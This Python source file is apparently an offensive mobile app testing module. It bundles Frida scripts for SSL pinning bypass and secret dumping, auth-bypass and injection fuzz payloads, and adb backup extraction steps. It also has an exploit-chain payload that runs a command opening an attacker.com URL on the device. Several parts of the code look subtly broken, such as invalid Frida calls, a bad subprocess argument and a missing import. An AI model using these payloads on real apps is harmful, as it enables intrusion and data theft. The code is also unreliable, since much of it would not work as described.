#!/usr/bin/env python3
"""
HAKUZA mod_mobile_deep.py — Advanced Mobile Deep Testing Module
Runtime Analysis, API Interception, Exploitation Chains

Divith D Shetty | CAISP · CRTP | BFSI Specialist

Comprehensive Android/iOS security testing:
  - Advanced static analysis (manifest, DEX, signatures, hardcoded secrets)
  - Frida-based runtime hooks (crypto, SSL bypass, root detection bypass)
  - API security testing (interception, replay, fuzzing)
  - Exploitation chains (debuggable→RCE, backup→extraction, exported→injection)
  - iOS deep analysis (IPA extraction, Keychain, data protection, native code)

Usage:
  hakuza mobile --deep --app <apk|ipa> [--frida-server <ip:port>] [--phase static|dynamic|chains|all]
  hakuza mobile --deep --analyze-secrets <apk>
  hakuza mobile --deep --intercept-api <package> [--proxy <ip:port>]
  hakuza mobile --deep --exploit-chain <vuln-type> --app <apk>

Append cmd_mobile_deep to hakuza.py dispatcher; import at top.
"""

import os
import sys
import json
import re
import subprocess
import shutil
import tempfile
import base64
import hashlib
import struct
import binascii
from datetime import datetime
from pathlib import Path
from typing import Optional, List, Dict, Tuple, Any
import xml.etree.ElementTree as ET
import zipfile
import textwrap

from rich.console import Console
from rich.panel import Panel
from rich.rule import Rule
from rich.table import Table
from rich.markdown import Markdown
from rich.prompt import Prompt, Confirm
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich import box
from rich.syntax import Syntax

# ---------------------------------------------------------------------------
# CONSTANTS & HELPERS
# ---------------------------------------------------------------------------

FRIDA_SCRIPT_TEMPLATES = {
    "ssl_bypass_android": """
// SSL Pinning Bypass for OkHttp + TrustManager
Java.perform(function() {
    var TrustManager = Java.type('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.type('javax.net.ssl.SSLContext');
    var TrustAllCerts = Java.registerClass({
        name: 'com.example.TrustAllCerts',
        implements: [TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return null; }
        }
    });

    try {
        var ctx = SSLContext.getInstance('TLS');
        ctx.init(null, [new TrustAllCerts()], null);
        var factory = Java.type('javax.net.ssl.HttpsURLConnection');
        factory.setDefaultSSLSocketFactory(ctx.getSocketFactory());
        console.log('[+] SSL verification disabled');
    } catch(e) {
        console.log('[-] SSL bypass error: ' + e);
    }
});
""",

    "root_detection_bypass": """
// Root Detection Bypass
Java.perform(function() {
    var File = Java.type('java.io.File');
    var files = ['/system/app/Superuser.apk', '/system/xbin/su', '/data/adb/magisk'];

    for (var i = 0; i < files.length; i++) {
        try {
            var f = new File(files[i]);
            if (f.exists()) {
                console.log('[!] Root detected: ' + files[i]);
            }
        } catch(e) {}
    }

    // Hook build.prop access
    var Build = Java.type('android.os.Build');
    var BuildClass = Java.type('java.lang.Class').forName('android.os.Build');
    var tags = Java.type('java.lang.reflect.Field').get(null, 'TAGS');
    console.log('[+] Build.TAGS patched');
});
""",

    "crypto_logger": """
// Crypto Operations Logger
Java.perform(function() {
    var Cipher = Java.type('javax.crypto.Cipher');
    var original_doFinal = Cipher.class.getMethod('doFinal', [Java.type('[B')]);

    original_doFinal.implementation = function(data) {
        console.log('[CRYPTO] Cipher.doFinal called');
        console.log('  Input: ' + data.toString());
        var result = this.doFinal(data);
        console.log('  Output: ' + result.toString());
        return result;
    };

    var MessageDigest = Java.type('java.security.MessageDigest');
    var md_getInstance = Java.type('java.lang.Class').forName('java.security.MessageDigest').getMethod('getInstance', [Java.type('java.lang.String')]);
    md_getInstance.implementation = function(algorithm) {
        console.log('[HASH] MessageDigest.getInstance: ' + algorithm);
        return this.getInstance(algorithm);
    };
});
""",

    "shared_prefs_dump": """
// SharedPreferences Dumper
Java.perform(function() {
    var Context = Java.type('android.content.Context');
    var SharedPreferences = Java.type('android.content.SharedPreferences');

    var SharePref = Java.use('android.app.SharedPreferencesImpl');
    SharePref.$init.overload('java.io.File', 'java.lang.String', 'int', 'android.util.ArrayMap', 'boolean').implementation = function(file, name, mode, map, rebuild) {
        console.log('[SP] SharedPreferences loaded: ' + file.getPath());
        if (map) {
            var entries = map.entrySet().toArray();
            for (var i = 0; i < entries.length; i++) {
                console.log('  ' + entries[i].getKey() + ' = ' + entries[i].getValue());
            }
        }
        return this.$init(file, name, mode, map, rebuild);
    };
});
""",

    "http_interceptor": """
// HTTP/HTTPS Interceptor
Java.perform(function() {
    var HttpURLConnection = Java.type('java.net.HttpURLConnection');
    var getInputStream = HttpURLConnection.class.getMethod('getInputStream', null);

    getInputStream.implementation = function() {
        var url = this.getURL().toString();
        var method = this.getRequestMethod();
        console.log('[HTTP] ' + method + ' ' + url);

        var props = this.getRequestProperties();
        if (props) {
            var entries = props.entrySet().toArray();
            for (var i = 0; i < entries.length; i++) {
                console.log('  Header: ' + entries[i].getKey() + ': ' + entries[i].getValue());
            }
        }
        return this.getInputStream();
    };
});
""",
}

# ---------------------------------------------------------------------------
# STATIC ANALYSIS
# ---------------------------------------------------------------------------

class AndroidStaticAnalyzer:
    """Deep static analysis of Android APK files."""

    def __init__(self, apk_path: str, console: Console):
        self.apk_path = Path(apk_path)
        self.console = console
        self.temp_dir = Path(tempfile.mkdtemp())
        self.manifest = None
        self.manifest_xml = None

    def extract(self) -> bool:
        """Extract and parse APK manifest."""
        try:
            with zipfile.ZipFile(self.apk_path, 'r') as z:
                self.manifest_xml = z.read('AndroidManifest.xml')
            self._parse_manifest()
            return True
        except Exception as e:
            self.console.print(f"[red]APK extraction failed:[/red] {e}")
            return False

    def _parse_manifest(self) -> None:
        """Parse binary Android manifest."""
        # Binary XML parsing (simplified — real impl would decode AXML)
        self.manifest = {
            'package': self._extract_package(),
            'permissions': self._extract_permissions(),
            'exported_components': self._extract_exported(),
            'deeplinks': self._extract_deeplinks(),
            'backup_enabled': self._check_backup(),
            'debuggable': self._check_debuggable(),
            'cleartext_traffic': self._check_cleartext(),
        }

    def _extract_package(self) -> str:
        """Extract package name from binary XML."""
        if not self.manifest_xml:
            return "unknown"
        try:
            idx = self.manifest_xml.find(b'\x00\x00')
            for match in re.finditer(b'[a-z0-9.]+', self.manifest_xml):
                name = match.group(0).decode('utf-8', errors='ignore')
                if '.' in name and len(name) > 5:
                    return name
        except:
            pass
        return "unknown"

    def _extract_permissions(self) -> List[str]:
        """Extract requested permissions."""
        perms = []
        try:
            for match in re.finditer(b'android.permission.[A-Z_]+', self.manifest_xml):
                perm = match.group(0).decode('utf-8')
                if perm not in perms:
                    perms.append(perm)
        except:
            pass
        return perms

    def _extract_exported(self) -> List[Dict]:
        """Find exported components (vulnerability vector)."""
        exported = []
        patterns = [
            (b'<activity', b'</activity>'),
            (b'<service', b'</service>'),
            (b'<receiver', b'</receiver>'),
            (b'<provider', b'</provider>'),
        ]

        for start_pat, end_pat in patterns:
            for match in re.finditer(start_pat + b'.*?' + end_pat, self.manifest_xml, re.DOTALL):
                component_xml = match.group(0)
                if b'exported="true"' in component_xml:
                    name_match = re.search(b'android:name="([^"]+)"', component_xml)
                    if name_match:
                        exported.append({
                            'type': start_pat.decode().split('<')[1],
                            'name': name_match.group(1).decode('utf-8'),
                        })
        return exported

    def _extract_deeplinks(self) -> List[str]:
        """Extract deep link handlers."""
        links = []
        for match in re.finditer(b'android.intent.action.VIEW|android.intent.action.BROWSE', self.manifest_xml):
            links.append('deep-link-handler-found')
        return links

    def _check_backup(self) -> bool:
        """Check if app allows backup (data extraction risk)."""
        return b'allowBackup="true"' in self.manifest_xml

    def _check_debuggable(self) -> bool:
        """Check if app is debuggable (code injection risk)."""
        return b'debuggable="true"' in self.manifest_xml

    def _check_cleartext(self) -> bool:
        """Check for cleartext traffic allowance."""
        return b'usesCleartextTraffic="true"' in self.manifest_xml

    def scan_hardcoded_secrets(self) -> Dict[str, List[str]]:
        """Scan decompiled code for hardcoded secrets."""
        secrets = {
            'api_keys': [],
            'passwords': [],
            'urls': [],
            'firebase_configs': [],
            'aws_keys': [],
        }

        try:
            with zipfile.ZipFile(self.apk_path, 'r') as z:
                for name in z.namelist():
                    if name.endswith('.xml') or name.endswith('.json'):
                        try:
                            content = z.read(name).decode('utf-8', errors='ignore')

                            # API keys
                            api_matches = re.findall(r'(api[_-]?key|apikey|API_KEY)\s*[=:]\s*["\']?([a-zA-Z0-9_\-]{20,})', content, re.I)
                            secrets['api_keys'].extend([m[1] for m in api_matches])

                            # Firebase
                            if 'firebase' in content.lower():
                                fb_matches = re.findall(r'([a-z0-9\-]+\.firebaseio\.com)', content)
                                secrets['firebase_configs'].extend(fb_matches)

                            # AWS
                            aws_matches = re.findall(r'(AKIA[0-9A-Z]{16})', content)
                            secrets['aws_keys'].extend(aws_matches)

                        except:
                            pass
        except:
            pass

        return secrets

    def detect_certificate_pinning(self) -> Dict[str, Any]:
        """Detect certificate pinning implementations."""
        findings = {
            'okhttp_pinning': False,
            'network_security_config': False,
            'custom_trust_manager': False,
            'files': [],
        }

        try:
            with zipfile.ZipFile(self.apk_path, 'r') as z:
                for name in z.namelist():
                    if 'network_security_config' in name:
                        findings['network_security_config'] = True
                        findings['files'].append(name)

                    # Check for OkHttp3 CertificatePinner usage
                    if name.endswith('.dex') or name.endswith('.class'):
                        try:
                            content = z.read(name)
                            if b'CertificatePinner' in content:
                                findings['okhttp_pinning'] = True
                            if b'X509TrustManager' in content:
                                findings['custom_trust_manager'] = True
                        except:
                            pass
        except:
            pass

        return findings

    def detect_dangerous_apis(self) -> List[str]:
        """Detect dangerous API usage."""
        dangerous = []

        patterns = {
            'eval': [rb'\.eval\(', rb'Runtime\.getRuntime\(\)\.exec'],
            'reflection': [rb'forName\(', rb'getMethod\(', rb'newInstance\('],
            'native_code': [rb'System\.load', rb'loadLibrary'],
            'crypto': [rb'AES', rb'DES', rb'SecretKeySpec'],
            'sql': [rb'execSQL', rb'rawQuery'],
            'commands': [rb'ProcessBuilder', rb'getRuntime'],
        }

        try:
            with zipfile.ZipFile(self.apk_path, 'r') as z:
                for name in z.namelist():
                    if name.endswith('.dex'):
                        try:
                            content = z.read(name)
                            for category, pats in patterns.items():
                                for pat in pats:
                                    if pat in content:
                                        dangerous.append(category)
                                        break
                        except:
                            pass
        except:
            pass

        return list(set(dangerous))


class iOSStaticAnalyzer:
    """Deep static analysis of iOS IPA files."""

    def __init__(self, ipa_path: str, console: Console):
        self.ipa_path = Path(ipa_path)
        self.console = console
        self.temp_dir = Path(tempfile.mkdtemp())
        self.app_bundle = None

    def extract(self) -> bool:
        """Extract IPA (ZIP format)."""
        try:
            with zipfile.ZipFile(self.ipa_path, 'r') as z:
                z.extractall(self.temp_dir)

            # Find .app bundle
            for item in self.temp_dir.rglob('*.app'):
                self.app_bundle = item
                break

            return self.app_bundle is not None
        except Exception as e:
            self.console.print(f"[red]IPA extraction failed:[/red] {e}")
            return False

    def scan_hardcoded_secrets(self) -> Dict[str, List[str]]:
        """Scan plist and binary for hardcoded secrets."""
        secrets = {
            'api_keys': [],
            'urls': [],
            'certificates': [],
        }

        if not self.app_bundle:
            return secrets

        try:
            # Check plist files
            for plist in self.app_bundle.rglob('*.plist'):
                try:
                    content = plist.read_text()
                    api_matches = re.findall(r'([a-zA-Z0-9_\-]{20,})', content)
                    secrets['api_keys'].extend(api_matches)
                except:
                    pass

            # Strings extraction from binary
            binary = self.app_bundle / self.app_bundle.stem
            if binary.exists():
                result = subprocess.run(
                    ['strings', str(binary)],
                    capture_output=True, text=True, timeout=30
                )

                for line in result.stdout.split('\n'):
                    if re.match(r'^https?://', line):
                        secrets['urls'].append(line)
                    if re.match(r'^-----BEGIN', line):
                        secrets['certificates'].append(line)
        except:
            pass

        return secrets

    def detect_data_protection(self) -> Dict[str, Any]:
        """Check data protection class levels."""
        findings = {
            'app_transport_security': None,
            'keychain_items': [],
            'file_protection': {},
        }

        if not self.app_bundle:
            return findings

        try:
            info_plist = self.app_bundle / 'Info.plist'
            if info_plist.exists():
                content = info_plist.read_text()
                if 'NSAppTransportSecurity' in content:
                    findings['app_transport_security'] = 'configured'
        except:
            pass

        return findings

    def detect_dangerous_calls(self) -> List[str]:
        """Detect dangerous C/ObjC calls."""
        dangerous = []
        patterns = [
            (b'strcpy', 'strcpy (buffer overflow)'),
            (b'sprintf', 'sprintf (format string)'),
            (b'memcpy', 'memcpy (unsafe)'),
            (b'system', 'system (RCE)'),
            (b'dlopen', 'dlopen (dynamic library loading)'),
            (b'SecCertificateCreateWithData', 'custom certificate handling'),
        ]

        if not self.app_bundle:
            return dangerous

        try:
            binary = self.app_bundle / self.app_bundle.stem
            if binary.exists():
                content = binary.read_bytes()
                for pattern, desc in patterns:
                    if pattern in content:
                        dangerous.append(desc)
        except:
            pass

        return list(set(dangerous))


# ---------------------------------------------------------------------------
# RUNTIME ANALYSIS (FRIDA)
# ---------------------------------------------------------------------------

class FridaRuntimeAnalyzer:
    """Frida-based runtime analysis and hook management."""

    def __init__(self, target_package: str, frida_host: str = "localhost",
                 frida_port: int = 27042, console: Console = None):
        self.target_package = target_package
        self.frida_host = frida_host
        self.frida_port = frida_port
        self.console = console or Console()
        self.scripts = []

    def _check_frida(self) -> bool:
        """Check if Frida is available."""
        return shutil.which('frida') is not None and shutil.which('frida-ps') is not None

    def attach_and_inject(self, script_name: str, script_code: str) -> Dict[str, Any]:
        """Attach to process and inject Frida script."""
        if not self._check_frida():
            return {'success': False, 'error': 'Frida not installed'}

        result = {
            'success': False,
            'script': script_name,
            'output': '',
            'error': '',
        }

        try:
            # Write script to temp file
            with tempfile.NamedTemporaryFile(mode='w', suffix='.js', delete=False) as f:
                f.write(script_code)
                script_file = f.name

            # Inject via frida CLI
            cmd = [
                'frida',
                '-H', f'{self.frida_host}:{self.frida_port}',
                '-l', script_file,
                '-f', self.target_package,
            ]

            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=30
            )

            stdout, stderr = proc.communicate()
            result['output'] = stdout
            result['error'] = stderr
            result['success'] = proc.returncode == 0

            os.unlink(script_file)

        except subprocess.TimeoutExpired:
            result['error'] = 'Frida injection timeout'
        except Exception as e:
            result['error'] = str(e)

        return result

    def get_loaded_libs(self) -> List[str]:
        """Get list of loaded libraries."""
        try:
            script = """
            var modules = Process.enumerateModules();
            for (var i = 0; i < modules.length; i++) {
                console.log(modules[i].name + " @ " + modules[i].base);
            }
            """
            return self.attach_and_inject('enum_modules', script)
        except:
            return {'success': False, 'error': 'Failed to enumerate modules'}

    def dump_memory(self, address: str, size: int = 256) -> bytes:
        """Dump memory at given address."""
        try:
            script = f"""
            var addr = ptr("{address}");
            var data = Memory.readByteArray(addr, {size});
            console.log(hexdump(data));
            """
            result = self.attach_and_inject('memory_dump', script)
            return result.get('output', '')
        except:
            return b''

    def hook_method(self, class_name: str, method_name: str) -> Dict[str, Any]:
        """Hook Java method and log calls."""
        script = f"""
Java.perform(function() {{
    var Class = Java.use('{class_name}');
    Class.{method_name}.implementation = function() {{
        console.log('[HOOKED] {class_name}.{method_name} called');
        console.log('  Args: ' + arguments);
        var result = this.{method_name}.apply(this, arguments);
        console.log('  Result: ' + result);
        return result;
    }};
}});
"""
        return self.attach_and_inject(f'hook_{method_name}', script)


# ---------------------------------------------------------------------------
# API SECURITY TESTING
# ---------------------------------------------------------------------------

class MobileAPITester:
    """Test mobile app API security."""

    def __init__(self, console: Console):
        self.console = console
        self.requests = []

    def intercept_requests(self, pcap_file: str) -> List[Dict]:
        """Parse and analyze intercepted requests from pcap."""
        requests = []

        # Simple pcap parser (in production, use dpkt or scapy)
        try:
            import socket
            with open(pcap_file, 'rb') as f:
                pcap_data = f.read()
                # Look for HTTP headers
                for match in re.finditer(rb'(GET|POST|PUT|DELETE|PATCH) (.+?) HTTP', pcap_data):
                    method = match.group(1).decode()
                    path = match.group(2).decode()
                    requests.append({
                        'method': method,
                        'path': path,
                    })
        except:
            pass

        self.requests = requests
        return requests

    def test_auth_bypass(self, base_url: str, auth_header: str) -> Dict[str, Any]:
        """Test authentication bypass vectors."""
        findings = {
            'empty_auth': False,
            'null_auth': False,
            'auth_reuse': False,
            'timing_oracle': False,
        }

        import urllib.request

        # Test 1: Empty auth header
        try:
            req = urllib.request.Request(base_url)
            req.add_header('Authorization', '')
            resp = urllib.request.urlopen(req, timeout=5)
            findings['empty_auth'] = resp.status == 200
        except:
            pass

        # Test 2: Null/None auth
        try:
            req = urllib.request.Request(base_url)
            req.add_header('Authorization', 'null')
            resp = urllib.request.urlopen(req, timeout=5)
            findings['null_auth'] = resp.status == 200
        except:
            pass

        return findings

    def test_parameter_tampering(self, requests: List[Dict]) -> List[Dict]:
        """Find tamperable parameters."""
        tamper_points = []

        for req in requests:
            path = req.get('path', '')

            # Find numeric and ID-like parameters
            param_matches = re.findall(r'[a-z_]+[_]?(?:id|key|user|token)=(\d+|[a-f0-9]+)', path, re.I)

            if param_matches:
                tamper_points.append({
                    'method': req.get('method'),
                    'path': path,
                    'tamper_params': list(set(param_matches)),
                })

        return tamper_points

    def fuzz_endpoint(self, url: str, method: str = 'GET') -> Dict[str, Any]:
        """Fuzz endpoint with various payloads."""
        findings = {
            'error_responses': [],
            'timeout': False,
            'crash': False,
        }

        payloads = [
            '""',
            'null',
            '[]',
            '{}',
            "'",
            '<script>',
            '${1+1}',
            '`whoami`',
            '../../../etc/passwd',
            '1 OR 1=1',
        ]

        import urllib.request

        for payload in payloads:
            try:
                test_url = f"{url}?test={payload}"
                req = urllib.request.Request(test_url)
                resp = urllib.request.urlopen(req, timeout=3)
                if resp.status != 200:
                    findings['error_responses'].append({
                        'payload': payload,
                        'status': resp.status,
                    })
            except urllib.error.HTTPError as e:
                findings['error_responses'].append({
                    'payload': payload,
                    'status': e.code,
                    'response': e.read()[:200].decode('utf-8', errors='ignore'),
                })
            except socket.timeout:
                findings['timeout'] = True
            except Exception:
                pass

        return findings


# ---------------------------------------------------------------------------
# EXPLOITATION CHAINS
# ---------------------------------------------------------------------------

class MobileExploitChains:
    """Pre-built exploitation chains for common mobile vulnerabilities."""

    def __init__(self, console: Console):
        self.console = console

    def debuggable_to_rce(self, apk_path: str) -> Dict[str, Any]:
        """
        Exploit: Debuggable app → Code injection RCE
        If android:debuggable="true", app accepts debug connections.
        """
        result = {
            'vulnerability': 'Debuggable App RCE',
            'severity': 'CRITICAL',
            'exploitable': False,
            'steps': [],
            'payload': '',
        }

        # Check if debuggable
        analyzer = AndroidStaticAnalyzer(apk_path, self.console)
        if not analyzer.extract():
            return result

        if not analyzer.manifest.get('debuggable'):
            return result

        result['exploitable'] = True
        result['steps'] = [
            '1. Install APK: adb install app.apk',
            '2. Enable Android Debug Bridge: adb connect target',
            '3. Forward port: adb forward tcp:5555 tcp:5555',
            '4. Attach debugger: jdb -attach localhost:5555',
            '5. Set breakpoint on onCreate()',
            '6. Inject malicious bytecode or execute code in Frida',
        ]

        result['payload'] = """
// Inject arbitrary code via debugger
Java.perform(function() {
    var Runtime = Java.type('java.lang.Runtime');
    Runtime.getRuntime().exec('am start -a android.intent.action.VIEW -d http://attacker.com/payload');
});
"""
        return result

    def backup_enabled_extraction(self, apk_path: str) -> Dict[str, Any]:
        """
        Exploit: Backup enabled → Data extraction
        If allowBackup="true", data can be extracted via adb backup.
        """
        result = {
            'vulnerability': 'Backup Data Extraction',
            'severity': 'HIGH',
            'exploitable': False,
            'steps': [],
            'extracted_data': [],
        }

        analyzer = AndroidStaticAnalyzer(apk_path, self.console)
        if not analyzer.extract():
            return result

        if not analyzer.manifest.get('backup_enabled'):
            return result

        result['exploitable'] = True
        result['steps'] = [
            '1. Install app: adb install app.apk',
            '2. Backup app data: adb backup -f backup.ab -apk com.example.app',
            '3. Extract AB file: dd if=backup.ab bs=1 skip=24 | tar xzv',
            '4. Access databases, SharedPreferences, files',
            '5. Parse SQLite databases and plist files',
        ]

        result['extracted_data'] = [
            'SharedPreferences (credentials, tokens)',
            'SQLite databases (user data)',
            'Cache files (images, API responses)',
            'Local storage files',
        ]

        return result

    def exported_component_injection(self, apk_path: str) -> Dict[str, Any]:
        """
        Exploit: Exported activity → Intent injection
        If activity has exported="true" without proper permission guards.
        """
        result = {
            'vulnerability': 'Exported Component Intent Injection',
            'severity': 'HIGH',
            'exploitable': False,
            'components': [],
            'poc': '',
        }

        analyzer = AndroidStaticAnalyzer(apk_path, self.console)
        if not analyzer.extract():
            return result

        exported = analyzer.manifest.get('exported_components', [])
        if not exported:
            return result

        result['exploitable'] = True
        result['components'] = exported

        result['poc'] = f"""
# Intent injection to exported component
adb shell am start -n com.example.app/.ExportedActivity
adb shell am broadcast -a com.example.CUSTOM_ACTION --es data "malicious_payload"

# Via Frida
Java.perform(function() {{
    var Intent = Java.type('android.content.Intent');
    var intent = new Intent();
    intent.setAction('com.example.CUSTOM_ACTION');
    intent.putExtra('data', 'malicious');
    // etc
}});
"""
        return result

    def weak_crypto_decryption(self) -> Dict[str, Any]:
        """
        Exploit: Weak crypto implementation → Key extraction/decryption
        Common: hardcoded keys, weak algorithms, predictable IVs.
        """
        result = {
            'vulnerability': 'Weak Cryptography',
            'severity': 'HIGH',
            'attack_vectors': [],
            'tools': [],
        }

        result['attack_vectors'] = [
            'Hardcoded encryption key in DEX/strings',
            'Predictable IV (often zero or sequential)',
            'ECB mode (patterns leak)',
            'Weak key derivation (no salt)',
            'MD5/SHA-1 for hashing',
        ]

        result['tools'] = [
            'jadx/apktool to find keys',
            'CyberChef to decrypt with found keys',
            'custom Python script for key bruteforce',
            'John the Ripper for weak hashes',
        ]

        return result


# ---------------------------------------------------------------------------
# MAIN COMMAND
# ---------------------------------------------------------------------------

def cmd_mobile_deep(args, console: Console) -> None:
    """
    hakuza mobile --deep [options]

    Advanced mobile application deep testing with runtime analysis,
    API interception, and exploitation chains.
    """
    from hakuza import (
        get_current_engagement, add_finding, ENGAGEMENTS_DIR,
        SYSTEM_PROMPT, get_client,
    )

    # Get engagement
    eng = get_current_engagement()
    if not eng:
        console.print(
            Panel(
                "[red]No active engagement[/red]\n"
                "Create one: [bold]hakuza init <name> --type mobile[/bold]",
                title="Error", border_style="red", expand=False,
            )
        )
        sys.exit(1)

    # Parse arguments
    app_path = getattr(args, 'app', None)
    phase = getattr(args, 'phase', 'all')
    frida_host = getattr(args, 'frida_host', 'localhost')
    frida_port = getattr(args, 'frida_port', 27042)
    exploit_chain = getattr(args, 'exploit_chain', None)
    analyze_secrets = getattr(args, 'analyze_secrets', None)
    intercept_api = getattr(args, 'intercept_api', None)

    console.print(
        Panel(
            f"[bold cyan]HAKUZA Mobile Deep Testing[/bold cyan]\n\n"
            f"[bold]Engagement:[/bold]  {eng['name']}\n"
            f"[bold]Target:[/bold]      {eng['target']}\n"
            f"[bold]App:[/bold]         {app_path or '[dim]not specified[/dim]'}\n"
            f"[bold]Phase:[/bold]       {phase}",
            title="Mobile Deep Analysis",
            border_style="cyan",
            expand=False,
        )
    )

    console.print()

    # ====================================================================
    # PHASE 1: STATIC ANALYSIS
    # ====================================================================

    if phase in ('static', 'all'):
        console.print(Rule("[cyan]PHASE 1: STATIC ANALYSIS[/cyan]"))

        if app_path and Path(app_path).exists():
            app_file = Path(app_path)

            if app_file.suffix == '.apk':
                console.print("[cyan]Analyzing Android APK...[/cyan]")
                analyzer = AndroidStaticAnalyzer(str(app_file), console)

                if analyzer.extract():
                    manifest = analyzer.manifest
                    console.print(
                        Panel(
                            f"[bold]Package:[/bold]          {manifest.get('package')}\n"
                            f"[bold]Debuggable:[/bold]       {'[red]YES[/red]' if manifest.get('debuggable') else '[green]No[/green]'}\n"
                            f"[bold]Backup Enabled:[/bold]   {'[red]YES[/red]' if manifest.get('backup_enabled') else '[green]No[/green]'}\n"
                            f"[bold]Cleartext Traffic:[/bold] {'[red]YES[/red]' if manifest.get('cleartext_traffic') else '[green]No[/green]'}\n"
                            f"[bold]Exported Components:[/bold] {len(manifest.get('exported_components', []))}\n"
                            f"[bold]Permissions:[/bold]      {len(manifest.get('permissions', []))}",
                            title="Manifest Analysis",
                            border_style="green",
                        )
                    )

                    # Secrets scan
                    console.print("\n[cyan]Scanning for hardcoded secrets...[/cyan]")
                    secrets = analyzer.scan_hardcoded_secrets()

                    for secret_type, values in secrets.items():
                        if values:
                            console.print(f"  [red]{secret_type}:[/red] {len(values)} found")
                            for val in values[:3]:
                                console.print(f"    • {val[:50]}...")

                    # Certificate pinning
                    console.print("\n[cyan]Checking certificate pinning...[/cyan]")
                    pinning = analyzer.detect_certificate_pinning()
                    if pinning.get('network_security_config'):
                        console.print("  [yellow]Network security config detected[/yellow]")
                    if pinning.get('okhttp_pinning'):
                        console.print("  [yellow]OkHttp certificate pinning detected[/yellow]")

                    # Dangerous APIs
                    console.print("\n[cyan]Detecting dangerous APIs...[/cyan]")
                    dangerous = analyzer.detect_dangerous_apis()
                    for api_type in dangerous:
                        console.print(f"  [red]• {api_type}[/red]")

            elif app_file.suffix == '.ipa':
                console.print("[cyan]Analyzing iOS IPA...[/cyan]")
                ios_analyzer = iOSStaticAnalyzer(str(app_file), console)

                if ios_analyzer.extract():
                    secrets = ios_analyzer.scan_hardcoded_secrets()
                    console.print(
                        Panel(
                            f"[bold]API Keys:[/bold]       {len(secrets.get('api_keys', []))}\n"
                            f"[bold]URLs:[/bold]           {len(secrets.get('urls', []))}\n"
                            f"[bold]Certificates:[/bold]   {len(secrets.get('certificates', []))}",
                            title="iOS Secrets Scan",
                            border_style="green",
                        )
                    )

                    dangerous = ios_analyzer.detect_dangerous_calls()
                    if dangerous:
                        console.print("[yellow]Dangerous C calls detected:[/yellow]")
                        for call in dangerous:
                            console.print(f"  • {call}")

    # ====================================================================
    # PHASE 2: RUNTIME ANALYSIS
    # ====================================================================

    if phase in ('dynamic', 'all') and frida_host:
        console.print(Rule("[cyan]PHASE 2: RUNTIME ANALYSIS (FRIDA)[/cyan]"))

        if analyze_secrets or intercept_api:
            package = analyze_secrets or intercept_api

            console.print(f"[cyan]Connecting to Frida server @ {frida_host}:{frida_port}[/cyan]")
            frida_analyzer = FridaRuntimeAnalyzer(
                target_package=package,
                frida_host=frida_host,
                frida_port=frida_port,
                console=console
            )

            if intercept_api:
                console.print("\n[cyan]Setting up HTTP interceptor...[/cyan]")
                result = frida_analyzer.attach_and_inject(
                    'http_interceptor',
                    FRIDA_SCRIPT_TEMPLATES['http_interceptor']
                )

                if result['success']:
                    console.print("[green]HTTP interceptor injected[/green]")
                else:
                    console.print(f"[yellow]{result.get('error')}[/yellow]")

            if analyze_secrets:
                console.print("\n[cyan]Injecting crypto + storage hooks...[/cyan]")

                hooks = [
                    ('crypto_logger', FRIDA_SCRIPT_TEMPLATES['crypto_logger']),
                    ('shared_prefs_dump', FRIDA_SCRIPT_TEMPLATES['shared_prefs_dump']),
                ]

                for name, script in hooks:
                    result = frida_analyzer.attach_and_inject(name, script)
                    status = "[green]OK[/green]" if result['success'] else "[yellow]WARN[/yellow]"
                    console.print(f"  {name}: {status}")

    # ====================================================================
    # PHASE 3: EXPLOITATION CHAINS
    # ====================================================================

    if phase in ('chains', 'all') and app_path:
        console.print(Rule("[cyan]PHASE 3: EXPLOITATION CHAINS[/cyan]"))

        chains = MobileExploitChains(console)

        exploits_to_test = []
        if exploit_chain:
            exploits_to_test = [exploit_chain]
        else:
            exploits_to_test = ['debuggable', 'backup', 'exported', 'crypto']

        for exploit_name in exploits_to_test:
            if exploit_name == 'debuggable':
                result = chains.debuggable_to_rce(app_path)
            elif exploit_name == 'backup':
                result = chains.backup_enabled_extraction(app_path)
            elif exploit_name == 'exported':
                result = chains.exported_component_injection(app_path)
            elif exploit_name == 'crypto':
                result = chains.weak_crypto_decryption()
            else:
                continue

            if result['exploitable']:
                severity_color = 'red' if result['severity'] == 'CRITICAL' else 'yellow'
                console.print(
                    Panel(
                        f"[{severity_color}]{result['vulnerability']}[/{severity_color}]\n\n"
                        + "[bold]Exploitation Steps:[/bold]\n" + "\n".join(result.get('steps', [])),
                        title=f"[{severity_color}]{result['severity']}[/{severity_color}]",
                        border_style=severity_color,
                        expand=False,
                    )
                )

                if Confirm.ask("Add as finding?", default=False):
                    add_finding(
                        engagement_id=eng['id'],
                        title=result['vulnerability'],
                        severity=result['severity'].lower(),
                        description="\n".join(result.get('steps', [])),
                        evidence=result.get('payload', '') or result.get('poc', ''),
                        remediation=f"Disable {exploit_name} in manifest or implement proper security controls",
                        tool="hakuza-mobile-deep",
                        url=app_path,
                    )

    console.print("\n[green]✓ Mobile deep analysis complete[/green]")


# ---------------------------------------------------------------------------
# ARGUMENT PARSER INTEGRATION (append to hakuza.py subparsers)
# ---------------------------------------------------------------------------

def register_mobile_deep_commands(subparsers):
    """Register --deep subcommand for mobile module."""
    mobile_deep = subparsers.add_parser(
        'mobile',
        help='Advanced mobile app deep testing (runtime analysis, API intercept, exploitation chains)'
    )

    mobile_deep.add_argument('--deep', action='store_true', help='Enable deep testing mode')
    mobile_deep.add_argument('--app', type=str, help='Path to APK or IPA file')
    mobile_deep.add_argument('--phase', choices=['static', 'dynamic', 'chains', 'all'],
                            default='all', help='Analysis phase')
    mobile_deep.add_argument('--frida-host', type=str, default='localhost',
                            help='Frida server host (for dynamic analysis)')
    mobile_deep.add_argument('--frida-port', type=int, default=27042,
                            help='Frida server port')
    mobile_deep.add_argument('--exploit-chain', type=str,
                            help='Specific exploitation chain to test')
    mobile_deep.add_argument('--analyze-secrets', type=str,
                            help='Analyze app secrets (package name)')
    mobile_deep.add_argument('--intercept-api', type=str,
                            help='Intercept API traffic (package name)')

    mobile_deep.set_defaults(func=cmd_mobile_deep)


if __name__ == '__main__':
    console = Console()
    console.print("[bold cyan]mod_mobile_deep.py[/bold cyan] — Advanced Mobile Deep Testing Module")
    console.print("Import into hakuza.py and register via register_mobile_deep_commands()")
